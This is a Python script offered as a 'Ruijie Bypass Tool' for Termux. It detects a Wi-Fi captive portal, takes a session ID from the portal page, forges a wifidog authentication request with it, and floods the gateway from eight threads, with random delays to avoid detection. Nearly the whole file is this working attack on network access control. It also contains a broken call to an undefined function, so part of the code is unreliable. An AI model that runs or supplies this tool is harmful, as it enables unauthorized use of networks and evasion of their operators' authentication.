# bypass
Ruijie Bypass Tool for Termux
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ruijie Bypass Tool v3 - Termux Optimized
Enhanced for Mobile Networks
"""

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# TERMUX OPTIMIZED CONFIG
# ===============================
PING_THREADS = 8  # Termux အတွက် ပိုကောင်းအောင်များတယ်
MIN_INTERVAL = 0.03
MAX_INTERVAL = 0.1
DEBUG = False
CONNECTION_TIMEOUT = 8
RETRY_COUNT = 3

# ===============================
# COLORS (Termux Compatible)
# ===============================
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[0;33m"
MAGENTA = "\033[0;35m"
BLUE = "\033[0;34m"
BOLD = "\033[1m"
RESET = "\033[00m"
CLEAR = "\033[2J\033[H"

# ===============================
# LOGGING
# ===============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

# Statistics
stats = {
    'total': 0,
    'success': 0,
    'avg_ms': 0
}

# ===============================
# ENHANCED INTERNET CHECK
# ===============================
def check_real_internet():
    """Multiple endpoints for better detection"""
    test_urls = [
        "http://www.ruijienetworks.com",
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
        "http://www.msftconnecttest.com/connecttest.txt"
    ]
    
    for url in test_urls:
        try:
            r = requests.get(url, timeout=3, verify=False)
            if r.status_code == 200 or r.status_code == 204:
                return True
        except:
            continue
    return False

def check_dns():
    """Check DNS resolution"""
    try:
        import socket
        socket.gethostbyname("google.com")
        return True
    except:
        return False

# ===============================
# BANNER
# ===============================
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{MAGENTA}{BOLD}
╔══════════════════════════════════════════════╗
║     Ruijie Bypass Tool v3 - Termux           ║
║         Mobile Optimized Edition             ║
║           🔓 FREE - NO KEY NEEDED 🔓          ║
╚══════════════════════════════════════════════╝
{RESET}""")
    print(f"{CYAN}📱 Termux Mode Active{RESET}")
    print(f"{YELLOW}⚠️  Press Ctrl+C to stop{RESET}\n")

# ===============================
# OPTIMIZED PING THREAD
# ===============================
def turbo_ping(auth_link, sid, thread_id):
    """Optimized for mobile network conditions"""
    session = requests.Session()
    session.keep_alive = False
    
    local_total = 0
    local_success = 0
    
    while not stop_event.is_set():
        try:
            # Random delay to avoid detection
            delay = random.uniform(MIN_INTERVAL, MAX_INTERVAL)
            
            start = time.time()
            headers = {
                'User-Agent': f'Ruijey-Bypass/{thread_id}',
                'Connection': 'close'
            }
            
            r = session.get(auth_link, timeout=CONNECTION_TIMEOUT, headers=headers)
            elapsed = (time.time() - start) * 1000
            
            local_total += 1
            local_success += 1
            
            # Update global stats
            stats['total'] += 1
            stats['success'] += 1
            stats['avg_ms'] = (stats['avg_ms'] + elapsed) / 2
            
            # Color based on response time
            if elapsed < 60:
                color = GREEN
                symbol = "⚡"
            elif elapsed < 150:
                color = YELLOW
                symbol = "•"
            else:
                color = RED
                symbol = "⚠"
            
            # Progress display
            rate = (local_success/local_total*100) if local_total > 0 else 0
            print(f"{color}{symbol}{RESET} T{thread_id} | {elapsed:.0f}ms | "
                  f"✓{local_success}/{local_total}({rate:.0f}%)", end="\r")
            
            time.sleep(delay)
            
        except requests.exceptions.Timeout:
            local_total += 1
            stats['total'] += 1
            print(f"{RED}✗{RESET} T{thread_id} | TIMEOUT | ✓{local_success}/{local_total}", end="\r")
            time.sleep(0.1)
            
        except Exception as e:
            if DEBUG:
                print(f"{RED}!{RESET} T{thread_id} Error", end="\r")
            time.sleep(0.2)

# ===============================
# EXTRACT SESSION ID (Enhanced)
# ===============================
def extract_session_id(text, url):
    """Multiple methods to extract session ID"""
    
    # Method 1: From URL parameters
    parsed = urlparse(url)
    sid = parse_qs(parsed.query).get('sessionId', [None])[0]
    if sid:
        return sid
    
    # Method 2: From JavaScript
    patterns = [
        r'sessionId["\']?\s*[=:]\s*["\']([a-zA-Z0-9]+)',
        r'sid["\']?\s*[=:]\s*["\']([a-zA-Z0-9]+)',
        r'token["\']?\s*[=:]\s*["\']([a-zA-Z0-9]+)',
        r'["\']sessionId["\']\s*:\s*["\']([^"\']+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1)
    
    # Method 3: From hidden input fields
    hidden_match = re.search(r'<input[^>]*name=["\']sessionId["\'][^>]*value=["\']([^"\']+)', text)
    if hidden_match:
        return hidden_match.group(1)
    
    return None

# ===============================
# MAIN PROCESS
# ===============================
def start_process():
    banner()
    
    # Check Termux environment
    is_termux = os.path.exists('/data/data/com.termux')
    if is_termux:
        print(f"{GREEN}✅ Termux environment detected{RESET}")
        print(f"{CYAN}📡 Optimizing for mobile network...{RESET}\n")
    
    # Initial checks
    print(f"{CYAN}[*] System Check:{RESET}")
    print(f"    • DNS: {'✅ Working' if check_dns() else '❌ Failed'}")
    
    if check_real_internet():
        print(f"    • Internet: {GREEN}✅ Already Connected{RESET}")
        print(f"\n{YELLOW}[!] You already have internet!{RESET}")
        print(f"{CYAN}[*] Monitoring connection...{RESET}\n")
    
    print(f"\n{CYAN}[*] Scanning for captive portal...{RESET}")
    
    session = requests.Session()
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    
    while not stop_event.is_set():
        try:
            # Check for portal
            r = requests.get(test_url, allow_redirects=True, timeout=5, verify=False)
            
            # No portal detected
            if r.url == test_url or r.status_code == 204:
                if check_real_internedns():
                    print(f"{YELLOW}🌐 Internet active... monitoring{RESET}", end="\r")
                else:
                    print(f"{CYAN}🔍 No portal found... waiting{RESET}", end="\r")
                time.sleep(3)
                continue
            
            # Portal detected!
            portal_url = r.url
            parsed = urlparse(portal_url)
            portal_host = f"{parsed.scheme}://{parsed.netloc}"
            
            print(f"\n\n{GREEN}🔓 Captive Portal Detected!{RESET}")
            print(f"{CYAN}📍 Portal: {portal_host}{RESET}\n")
            
            # Step 1: Get portal page
            print(f"{CYAN}[1/4] Fetching portal page...{RESET}")
            r1 = session.get(portal_url, verify=False, timeout=10)
            
            # Step 2: Follow redirects
            print(f"{CYAN}[2/4] Following redirects...{RESET}")
            redirect_url = portal_url
            for _ in range(5):  # Max 5 redirects
                if redirect_url.startswith('http'):
                    r_temp = session.get(redirect_url, verify=False, timeout=10)
                    if r_temp.url != redirect_url:
                        redirect_url = r_temp.url
                    else:
                        break
            
            # Step 3: Extract Session ID
            print(f"{CYAN}[3/4] Extracting session ID...{RESET}")
            sid = extract_session_id(r1.text, redirect_url)
            
            if not sid:
                print(f"{RED}❌ Could not extract session ID{RESET}")
                print(f"{YELLOW}Retrying in 5 seconds...{RESET}")
                time.sleep(5)
                continue
            
            print(f"{GREEN}✅ Session ID: {sid}{RESET}\n")
            
            # Step 4: Get gateway info
            print(f"{CYAN}[4/4] Building authentication link...{RESET}")
            params = parse_qs(parsed.query)
            gw_addr = params.get('gw_address', [None])[0] or params.get('gw_addr', [None])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            
            if not gw_addr:
                # Try to extract from page
                ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
                ips = re.findall(ip_pattern, r1.text)
                for ip in ips:
                    if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
                        gw_addr = ip
                        break
            
            if not gw_addr:
                gw_addr = "192.168.60.1"
                print(f"{YELLOW}⚠️ Using default gateway: {gw_addr}{RESET}")
            else:
                print(f"{GREEN}✅ Gateway: {gw_addr}:{gw_port}{RESET}")
            
            # Build auth link
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
            
            # Launch threads
            print(f"\n{MAGENTA}🚀 Launching {PING_THREADS} turbo threads...{RESET}")
            print(f"{CYAN}🎯 Target: {gw_addr}:{gw_port}{RESET}")
            print(f"{YELLOW}💡 Press Ctrl+C to stop{RESET}\n")
            
            threads = []
            for i in range(PING_THREADS):
                t = threading.Thread(
                    target=turbo_ping,
                    args=(auth_link, sid, i+1),
                    daemon=True
                )
                t.start()
                threads.append(t)
                time.sleep(0.05)  # Stagger thread starts
            
            # Monitor connection
            last_status = False
            connection_time = 0
            
            while not stop_event.is_set():
                is_connected = check_real_internet()
                
                if is_connected and not last_status:
                    print(f"\n\n{GREEN}{BOLD}🎉 INTERNET CONNECTED! 🎉{RESET}")
                    print(f"{CYAN}📊 Stats: {stats['success']}/{stats['total']} "
                          f"({(stats['success']/stats['total']*100 if stats['total']>0 else 0):.1f}%) "
                          f"⚡ Avg: {stats['avg_ms']:.0f}ms{RESET}")
                    connection_time = time.time()
                    
                elif not is_connected and last_status:
                    print(f"\n{RED}❌ Connection lost! Reconnecting...{RESET}")
                    
                    # Check if connection lasted more than 30 seconds
                    if time.time() - connection_time > 30:
                        print(f"{GREEN}✓ Connection stable for {int(time.time()-connection_time)}s{RESET}")
                
                elif is_connected and last_status:
                    # Connection stable
                    duration = int(time.time() - connection_time)
                    if duration % 10 == 0 and duration > 0:
                        print(f"\r{GREEN}✓ Connected for {duration}s{RESET}   ", end="")
                
                last_status = is_connected
                
                # Show real-time stats
                if stats['total'] > 0:
                    rate = (stats['success']/stats['total']*100)
                    print(f"\r{CYAN}📈 Rate: {rate:.1f}% | "
                          f"⚡ {stats['avg_ms']:.0f}ms | "
                          f"📊 {stats['total']} pings{RESET}    ", end="")
                
                time.sleep(1)
            
        except KeyboardInterrupt:
            raise
            
        except requests.exceptions.ConnectionError:
            print(f"{YELLOW}⏳ No portal detected, scanning...{RESET}", end="\r")
            time.sleep(2)
            
        except Exception as e:
            if DEBUG:
                print(f"{RED}Error: {e}{RESET}")
            time.sleep(3)

# ===============================
# MAIN ENTRY
# ===============================
if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n\n{RED}{BOLD}🛑 Turbo Engine Shutdown{RESET}")
        print(f"{CYAN}📊 Final Statistics:{RESET}")
        print(f"   • Total Pings: {stats['total']}")
        print(f"   • Successful: {stats['success']}")
        if stats['total'] > 0:
            rate = (stats['success']/stats['total']*100)
            print(f"   • Success Rate: {rate:.1f}%")
            print(f"   • Average Response: {stats['avg_ms']:.0f}ms")
        print(f"\n{GREEN}✅ Tool terminated successfully{RESET}\n")
        sys.exit(0)
